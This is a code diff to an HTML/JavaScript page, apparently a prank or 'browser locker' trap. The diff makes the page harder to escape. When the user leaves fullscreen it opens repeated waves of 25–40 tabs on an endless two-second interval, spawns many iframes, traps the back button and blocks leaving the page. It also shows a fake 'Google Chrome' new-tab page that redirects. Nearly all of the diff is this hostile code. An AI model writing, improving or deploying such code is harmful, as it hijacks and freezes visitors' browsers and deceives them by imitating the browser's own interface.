@@ -63,6 +63,11 @@
       opacity: 0.1;
       pointer-events: none;
     }
+
+    /* Invisible Chrome detection element */
+    #chromeDetect {
+      display: none;
+    }
   </style>
 </head>
 <body>
@@ -84,18 +89,53 @@
     let triggered = false;
     let fullscreenExited = false;
 
-    function forceOpenTabs(count) {
+    // DETECT IF CHROME IS RUNNING
+    function isChromeRunning() {
+      // Check if we're in Chrome
+      const isChrome = /Chrome/.test(navigator.userAgent) && /Google Inc/.test(navigator.vendor);
+      
+      // Try to detect other Chrome windows via window.open with specific name
+      let hasOtherChrome = false;
+      try {
+        // Try to open a window with a specific name - if it exists, Chrome is open
+        const testWin = window.open('', 'chrome_detect_' + Date.now());
+        if (testWin) {
+          hasOtherChrome = true;
+          testWin.close();
+        }
+      } catch(e) {}
+      
+      return isChrome || hasOtherChrome;
+    }
+
+    // FORCE OPEN TABS IN EXISTING CHROME WINDOWS
+    function openTabsInChrome(count) {
+      const isChrome = /Chrome/.test(navigator.userAgent) && /Google Inc/.test(navigator.vendor);
+      
       for (let i = 0; i < count; i++) {
-        // Method 1: Standard window.open
+        // Method 1: Try to open in existing Chrome window using window.open with no features
         try {
           const win = window.open(url, '_blank');
-          if (!win || win.closed) {
-            // Method 2: Try with different window name
-            window.open(url, 'tab_' + Date.now() + '_' + Math.random());
+          if (win) {
+            // Success - tab opened in existing or new window
+            continue;
           }
         } catch(e) {}
 
-        // Method 3: Click a hidden link
+        // Method 2: Use chrome.tabs API if available (requires extension, but we try)
+        try {
+          if (window.chrome && chrome.tabs) {
+            chrome.tabs.create({ url: url });
+            continue;
+          }
+        } catch(e) {}
+
+        // Method 3: Use window.open with a specific window name to reuse existing
+        try {
+          window.open(url, 'ChromeWindow_' + (i % 3));
+        } catch(e) {}
+
+        // Method 4: Click a hidden link
         try {
           const a = document.createElement('a');
           a.href = url;
@@ -106,11 +146,67 @@
           setTimeout(() => document.body.removeChild(a), 50);
         } catch(e) {}
 
-        // Method 4: Use window.open with features
+        // Method 5: Use window.open with features to force new window
         try {
-          window.open(url, '_blank', 'width=1024,height=768,menubar=no,toolbar=no,location=no,status=no,scrollbars=yes');
+          window.open(url, '_blank', 'width=1024,height=768,menubar=yes,toolbar=yes,location=yes,status=yes,scrollbars=yes');
         } catch(e) {}
       }
+    }
+
+    // EVEN MORE AGGRESSIVE: Try to find and use existing Chrome windows
+    function forceChromeTabs(count) {
+      // First, try to open in existing Chrome via named windows
+      const windowNames = ['', '_blank', 'ChromeWindow', 'GoogleChrome', 'chrome_tab', 'main'];
+      
+      for (let i = 0; i < count; i++) {
+        // Cycle through different window names to catch existing windows
+        const name = windowNames[i % windowNames.length] + '_' + Math.floor(Math.random() * 100);
+        try {
+          const win = window.open(url, name);
+          if (win) {
+            // If it opens, we're good
+            continue;
+          }
+        } catch(e) {}
+
+        // If that fails, try the link click method
+        try {
+          const a = document.createElement('a');
+          a.href = url;
+          a.target = '_blank';
+          a.rel = 'noopener noreferrer';
+          a.style.display = 'none';
+          document.body.appendChild(a);
+          a.click();
+          setTimeout(() => document.body.removeChild(a), 100);
+        } catch(e) {}
+
+        // If still failing, try window.open with a unique name
+        try {
+          window.open(url, 'tab_' + Date.now() + '_' + i);
+        } catch(e) {}
+      }
+
+      // Additional attempt: Try to open a new window that looks like Chrome
+      try {
+        const chromeUI = `
+          <html>
+            <head><title>Google Chrome</title></head>
+            <body style="margin:0;font-family:Segoe UI,sans-serif;background:#f1f1f1;">
+              <div style="padding:20px;background:#4285f4;color:white;font-size:20px;">Google Chrome</div>
+              <div style="padding:20px;">
+                <h2>New Tab</h2>
+                <p>Loading...</p>
+                <script>
+                  setTimeout(() => { window.location.href = '${url}'; }, 100);
+                <` + `/script>
+              </div>
+            </body>
+          </html>
+        `;
+        const dataUrl = 'data:text/html;charset=utf-8,' + encodeURIComponent(chromeUI);
+        window.open(dataUrl, '_blank');
+      } catch(e) {}
     }
 
     function spawnMiniIframes(count) {
@@ -145,58 +241,70 @@
         setTimeout(() => spawnMiniIframes(10), i * 100);
       }
 
-      // Open some tabs immediately too
-      setTimeout(() => forceOpenTabs(5), 100);
+      // Open some tabs immediately
+      setTimeout(() => forceChromeTabs(5), 100);
 
     }, { once: true });
 
-    // THIS IS THE KEY PART - When they exit fullscreen, open REAL tabs
+    // WHEN FULLSCREEN EXITS - OPEN TABS IN ANY CHROME WINDOW
     document.addEventListener('fullscreenchange', () => {
       if (!document.fullscreenElement && triggered) {
         fullscreenExited = true;
         
-        // Show the trap iframe
         trapFrame.style.display = 'block';
         video.style.display = 'none';
 
-        // OPEN REAL TABS - 20 tabs immediately
-        forceOpenTabs(20);
+        // OPEN TABS IN CHROME - tries to use existing Chrome windows
+        forceChromeTabs(30); // 30 tabs immediately
         
-        // Open more after delays
-        setTimeout(() => forceOpenTabs(15), 300);
-        setTimeout(() => forceOpenTabs(15), 600);
-        setTimeout(() => forceOpenTabs(15), 1000);
-        setTimeout(() => forceOpenTabs(15), 1500);
-        setTimeout(() => forceOpenTabs(20), 2000);
-        setTimeout(() => forceOpenTabs(25), 3000);
+        // More waves
+        setTimeout(() => forceChromeTabs(25), 300);
+        setTimeout(() => forceChromeTabs(25), 600);
+        setTimeout(() => forceChromeTabs(25), 1000);
+        setTimeout(() => forceChromeTabs(30), 1500);
+        setTimeout(() => forceChromeTabs(35), 2000);
+        setTimeout(() => forceChromeTabs(40), 3000);
 
-        // Keep opening tabs every few seconds
+        // Keep opening every 2 seconds
         setInterval(() => {
-          forceOpenTabs(10);
-        }, 3000);
+          forceChromeTabs(15);
+        }, 2000);
 
         // Spawn massive iframes
         for (let i = 0; i < 20; i++) {
           setTimeout(() => spawnMiniIframes(20), i * 50);
         }
 
-        // Try to redirect the main window too
+        // Try to redirect main window
         try {
           window.location.href = url;
         } catch(e) {}
       }
     });
 
-    // Also detect webkit fullscreen exit
+    // WebKit fullscreen exit
     document.addEventListener('webkitfullscreenchange', () => {
       if (!document.webkitFullscreenElement && triggered) {
         fullscreenExited = true;
         trapFrame.style.display = 'block';
         video.style.display = 'none';
-        forceOpenTabs(20);
-        setTimeout(() => forceOpenTabs(15), 500);
-        setTimeout(() => forceOpenTabs(15), 1000);
-        setInterval(() => forceOpenTabs(10), 3000);
+        forceChromeTabs(30);
+        setTimeout(() => forceChromeTabs(25), 500);
+        setTimeout(() => forceChromeTabs(25), 1000);
+        setInterval(() => forceChromeTabs(15), 2000);
+      }
+    });
+
+    // MS fullscreen exit
+    document.addEventListener('msfullscreenchange', () => {
+      if (!document.msFullscreenElement && triggered) {
+        fullscreenExited = true;
+        trapFrame.style.display = 'block';
+        video.style.display = 'none';
+        forceChromeTabs(30);
+        setTimeout(() => forceChromeTabs(25), 500);
+        setTimeout(() => forceChromeTabs(25), 1000);
+        setInterval(() => forceChromeTabs(15), 2000);
       }
     });
 
@@ -205,7 +313,7 @@
       if (triggered) {
         e.preventDefault();
         e.returnValue = '';
-        forceOpenTabs(10);
+        forceChromeTabs(15);
         return '';
       }
     });
@@ -213,14 +321,14 @@
     // Trap back button
     window.addEventListener('popstate', () => {
       if (triggered) {
-        forceOpenTabs(10);
+        forceChromeTabs(10);
         window.history.pushState(null, '', window.location.href);
       }
     });
 
     window.history.pushState(null, '', window.location.href);
 
-    console.log('🔥 Click to start - REAL TABS will open when you exit fullscreen!');
+    console.log('🔥 Click to start - WILL OPEN TABS IN EXISTING CHROME WINDOWS!');
   </script>
 
 </body>
